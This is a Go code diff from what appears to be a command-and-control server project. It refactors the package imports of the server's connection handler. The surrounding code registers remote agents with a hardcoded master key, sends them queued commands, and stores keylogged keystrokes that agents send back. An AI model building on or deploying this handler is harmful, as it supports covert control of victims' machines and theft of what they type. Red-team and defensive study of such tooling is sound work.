@@ -11,7 +11,7 @@ import (
 	"strings"
 	"time"
 
-	"github.com/PatronC2/Patron/api/api"
+	"github.com/PatronC2/Patron/data"
 	"github.com/PatronC2/Patron/types"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/google/uuid"
@@ -60,16 +60,16 @@ func handleconn(connection net.Conn) {
 				if IsValidUUID(uid) {
 
 					// search uuid in database using received uuid
-					fetch, err := api.FetchOneAgent(uid)                  // first pass agent check
+					fetch, err := data.FetchOneAgent(uid)                  // first pass agent check
 					if err != nil {
 						logger.Logf(logger.Warning, "Couldn't fetch an agent: %s\n", err)
 					}
 					if fetch.Uuid == "" && masterkey == "MASTERKEY" { //prob check its a uuid and master key                // future fix (accepts all uuid) reason: to allow server create agent record in db
 						//parse IP, hostname and user from agent
-						api.CreateAgent(uid, AgentServerIP+":"+AgentServerPort, AgentFreq, AgentJitter, ip, user, hostname) // default values (callback set by user)
-						api.CreateKeys( uid)
+						data.CreateAgent(uid, AgentServerIP+":"+AgentServerPort, AgentFreq, AgentJitter, ip, user, hostname) // default values (callback set by user)
+						data.CreateKeys( uid)
 					}
-					fetch, err = api.FetchOneAgent( uid) // second pass agent check
+					fetch, err = data.FetchOneAgent( uid) // second pass agent check
 					if err != nil {
 						logger.Logf(logger.Warning, "Couldn't fetch an agent: %s\n", err)
 					}
@@ -80,7 +80,7 @@ func handleconn(connection net.Conn) {
 
 							logger.Logf(logger.Info, "Agent %s Connected\n", uid)
 							encoder := gob.NewEncoder(connection)
-							instruct := api.FetchNextCommand( fetch.Uuid)
+							instruct := data.FetchNextCommand( fetch.Uuid)
 							logger.Logf(logger.Info, "Fetched %s \n", instruct.CommandType)
 							if err := encoder.Encode(instruct); err != nil {
 								log.Fatalln(err)
@@ -94,7 +94,7 @@ func handleconn(connection net.Conn) {
 								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", uid, destruct.Output)
-								api.UpdateAgentCommand( destruct.CommandUUID, destruct.Output, fetch.Uuid)
+								data.UpdateAgentCommand( destruct.CommandUUID, destruct.Output, fetch.Uuid)
 								if destruct.Output == "~Killed~" {
 									logger.Logf(logger.Warning, "Agent %s Killed\n", uid)
 									connection.Close()
@@ -102,7 +102,7 @@ func handleconn(connection net.Conn) {
 								connection.Close()
 							}
 							now := time.Now()
-							api.UpdateAgentCheckIn( uid, now.Unix())
+							data.UpdateAgentCheckIn( uid, now.Unix())
 						} else if keyOrNot == "KeysBeacon" { // Handle keylog response
 
 							logger.Logf(logger.Info, "Agent %s Keys Beacon Connected\n", uid)
@@ -118,14 +118,14 @@ func handleconn(connection net.Conn) {
 
 							if destruct.Keys != "" {
 								logger.Logf(logger.Debug, "Agent %s with keys: %s\n", uid, destruct.Keys)
-								api.UpdateAgentKeys( uid, destruct.Keys)
+								data.UpdateAgentKeys( uid, destruct.Keys)
 								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back No Keys\n", uid)
 								connection.Close()
 							}
 							now := time.Now()
-							api.UpdateAgentCheckIn( uid, now.Unix())
+							data.UpdateAgentCheckIn( uid, now.Unix())
 						} else {
 							logger.Logf(logger.Info, "Unknown Beacon Type\n")
 							connection.Close()
@@ -164,7 +164,7 @@ func main() {
 	c2serverip := goDotEnvVariable("C2SERVER_IP")
 	c2serverport := goDotEnvVariable("C2SERVER_PORT")
 
-	api.OpenDatabase()
+	data.OpenDatabase()
 
 	cer, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
 	if err != nil {
@@ -182,7 +182,7 @@ func main() {
 	for {
 		select {
 		case <-ticker:
-			go api.UpdateAgentStatus()
+			go data.UpdateAgentStatus()
 		default:
 			connection, err := listener.Accept()
 			if err != nil {
